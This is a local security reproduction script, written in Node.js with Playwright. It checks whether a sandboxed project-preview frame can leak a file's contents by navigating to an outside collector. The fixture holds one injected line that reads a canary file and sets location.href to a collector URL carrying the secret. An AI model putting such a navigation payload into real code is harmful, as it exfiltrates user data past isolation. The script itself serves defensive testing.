// Local-only security reproduction. Exit 0 means the known navigation leak
// reached the collector; it NEVER means isolation or production acceptance.
import assert from 'node:assert/strict';
import {createServer} from 'node:http';
import {readFile, mkdir, writeFile} from 'node:fs/promises';
import {createHash, randomUUID} from 'node:crypto';
import {execFileSync} from 'node:child_process';
import {fileURLToPath} from 'node:url';
import {chromium} from 'playwright';
import worker from '../../services/browser-preview/execution/index.ts';
import {PROJECT_VIEW_FRAME_PATH, PROJECT_VIEW_FRAME_SHA256} from '../../services/project-views/frame.mjs';
import {projectFiles, packaged} from '../../tests/m3/project-views-fixture.mjs';

const root = new URL('../../', import.meta.url);
const output = new URL('../../.local/project-view-isolation/navigation-egress-evidence.json', import.meta.url);
const canary = 'SYNTHETIC_PROJECT_TEXT_' + randomUUID();
const received = [], requests = [], browserErrors = [];
const listen = server => new Promise((resolve, reject) => {
  server.once('error', reject);
  server.listen(0, '127.0.0.1', () => resolve('http://127.0.0.1:' + server.address().port));
});
let appOrigin, executionOrigin, browser, fixture, frameResponse;
const sink = createServer((req, res) => {
  received.push({at: new Date().toISOString(), method: req.method, url: req.url, headers: req.headers, remoteAddress: req.socket.remoteAddress});
  res.writeHead(200, {'content-type': 'text/plain'});
  res.end('synthetic collector');
});
const execution = createServer(async (req, res) => {
  try {
    const response = await worker.fetch(new Request(executionOrigin + req.url, {headers: req.headers}), {
      APP_ORIGIN: appOrigin, EXECUTION_ORIGIN: executionOrigin, ALLOW_LOCALHOST_HTTP: 'true',
    });
    frameResponse = {status: response.status, headers: Object.fromEntries(response.headers)};
    res.writeHead(response.status, Object.fromEntries(response.headers));
    res.end(Buffer.from(await response.arrayBuffer()));
  } catch {res.writeHead(500); res.end();}
});
const app = createServer(async (req, res) => {
  try {
    const url = new URL(req.url, appOrigin);
    if (url.pathname === '/') {
      res.setHeader('content-type', 'text/html');
      res.end('<div id="root"></div><script type="module">import {createProjectViewsPanel} from "/project-views.js";window.panel=createProjectViewsPanel({root:document.querySelector("#root"),api:async path=>(await fetch(path)).json()});await panel.enter(' + JSON.stringify(fixture.pkg.scope) + ');</script>');
      return;
    }
    if (url.pathname.endsWith('/project-views')) {
      res.setHeader('content-type', 'application/json');
      res.end(JSON.stringify(url.searchParams.has('identity') ? {current: true} : {
        package: fixture.pkg, delivery: {executionOrigin, frameUrl: executionOrigin + PROJECT_VIEW_FRAME_PATH},
      }));
      return;
    }
    // Only the fixed platform module names are served by this local fixture.
    if (!['/project-views.js', '/i18n.js', '/i18n-bindings.js'].includes(url.pathname)) {res.writeHead(404); res.end(); return;}
    const source = await readFile(new URL('../../services/web' + url.pathname, import.meta.url));
    res.setHeader('content-type', 'application/javascript'); res.end(source);
  } catch {res.writeHead(404); res.end();}
});
const startedAt = new Date().toISOString();
try {
  const collectorOrigin = await listen(sink);
  await fetch(collectorOrigin + '/control?case=collector-positive-control');
  assert(received.some(event => event.url.startsWith('/control?')));
  const files = projectFiles();
  files['docs/data.json'] = canary;
  files['app/main.mjs'] = 'const value=await riffoid.readFile("docs/data.json");location.href=' + JSON.stringify(collectorOrigin + '/escape?case=self-href&secret=') + '+encodeURIComponent(value.text);';
  fixture = await packaged(files);
  appOrigin = await listen(app); executionOrigin = await listen(execution);
  browser = await chromium.launch({headless: true, channel: process.env.M1_BROWSER_CHANNEL || 'chromium'});
  const page = await browser.newPage();
  page.on('request', req => requests.push({url: req.url(), method: req.method()}));
  page.on('pageerror', error => browserErrors.push(error.message));
  await page.goto(appOrigin);
  await page.waitForFunction(() => Boolean(window.panel));
  const matched = () => received.some(event => new URL(event.url, collectorOrigin).searchParams.get('secret') === canary);
  const deadline = Date.now() + 5000;
  while (!matched() && Date.now() < deadline) await new Promise(resolve => setTimeout(resolve, 25));
  const sources = {};
  for (const path of ['services/project-views/frame.mjs', 'services/web/project-views.js', 'services/project-views/package.ts', 'services/browser-preview/execution/index.ts']) {
    sources[path] = createHash('sha256').update(await readFile(new URL(path, root))).digest('hex');
  }
  const evidence = {
    schema: 'riffoid.project-view-navigation-reproduction/v1', startedAt, finishedAt: new Date().toISOString(),
    gitHeadAtExecution: execFileSync('git', ['rev-parse', 'HEAD'], {cwd: fileURLToPath(root), encoding: 'utf8'}).trim(),
    sourceDigests: sources, node: process.version, browser: browser.version(),
    browserChannel: process.env.M1_BROWSER_CHANNEL || 'chromium', chromiumSandbox: false,
    scope: 'Synthetic fixtures; three loopback HTTP servers; no authenticated/cloud execution.',
    origins: {appOrigin, executionOrigin, collectorOrigin}, frameSha256: PROJECT_VIEW_FRAME_SHA256,
    frameResponse, packageIdentity: fixture.pkg.packageIdentity, canarySha256: createHash('sha256').update(canary).digest('hex'),
    received, requests, browserErrors, knownP1Reproduced: matched(), productionEligible: false,
    result: matched() ? 'egress-observed' : 'not-observed-within-window',
    interpretation: 'Exit 0 confirms reproduction of the known defect, never successful isolation. Absence within 5 seconds does not prove network isolation.',
  };
  await mkdir(new URL('./', output), {recursive: true});
  await writeFile(output, JSON.stringify(evidence, null, 2) + '\n');
  console.log(JSON.stringify({knownP1Reproduced: matched(), productionEligible: false, evidence: fileURLToPath(output)}));
  if (!matched()) process.exitCode = 1;
} finally {
  await browser?.close();
  for (const server of [sink, execution, app]) if (server.listening) {
    server.closeAllConnections(); await new Promise(resolve => server.close(resolve));
  }
}
